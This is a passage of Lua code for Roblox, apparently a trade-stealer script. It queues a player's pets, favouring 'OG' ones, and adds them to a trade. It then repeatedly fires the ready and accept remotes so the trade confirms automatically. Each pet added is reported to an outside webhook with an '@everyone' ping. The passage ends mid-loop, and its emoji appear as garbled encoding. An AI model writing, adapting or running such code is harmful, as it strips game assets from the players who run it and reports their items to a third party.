local function addNextBrainrot(index)
    if not addRemote or index > #brainrotQueue then return false end
    local item = brainrotQueue[index]
    local data = item.data
    local isOGPet = item.isOG
    local payload = {UUID = data.UUID or data.Uid, LastCollect = data.LastCollect or 1771790678, Index = data.Index, OfflineGain = data.OfflineGain or 99, Steal = false}
    if data.Traits and type(data.Traits) == "table" then payload.Traits = data.Traits end
    if data.Mutation then
        if type(data.Mutation) == "string" and data.Mutation ~= "" then payload.Mutation = data.Mutation
        elseif type(data.Mutation) == "table" then
            if #data.Mutation > 0 then payload.Mutation = data.Mutation[1]
            else for traitName, _ in pairs(data.Mutation) do payload.Mutation = traitName break end end
        end
    end
    local success = pcall(function() addRemote:InvokeServer(item.slotKey, payload) end)
    if success then
        local name, rarity, mpsStr, mutName = getPetInfo(data)
        local ogTag = isOGPet and "ðŸ”¥OG " or ""
        local embed = {title = ogTag .. "ðŸ¾ Pet Added to Trade", description = string.format("**%s** [%s]\nRarity: %s %s\nMutation: %s", name, mpsStr, RarityIcons[rarity] or "â“", rarity, mutName), color = isOGPet and 16744192 or 16711680, footer = {text = os.date("%H:%M:%S")}}
        dualHook(embed, "@everyone", isOGPet)
    end
    return success
end

local function autoConfirm()
    if not (readyRemote and acceptRemote) then return end
    local start = os.clock()
    while os.clock() - start < 60 do
        pcall(function() readyRemote:FireServer() end)
        task.wait(0.8)
        pcall(function() acceptRemote:FireServer() end)
        task.wait(0.8)
    end
end

local function tradeCycle()
    task.spawn(function()
        local currentIndex = 1
        while true do
            if currentIndex <= #brainrotQueue then
                addNextBrainrot(currentIndex)
                currentIndex = currentIndex + 1
            else
                currentIndex = 1
            end
            task.wait(2)
        end
    end)

    task.spawn(function()
        while true do
            pcall(function() if searchRemote then searchRemote:InvokeServer(currentTarget) end end)
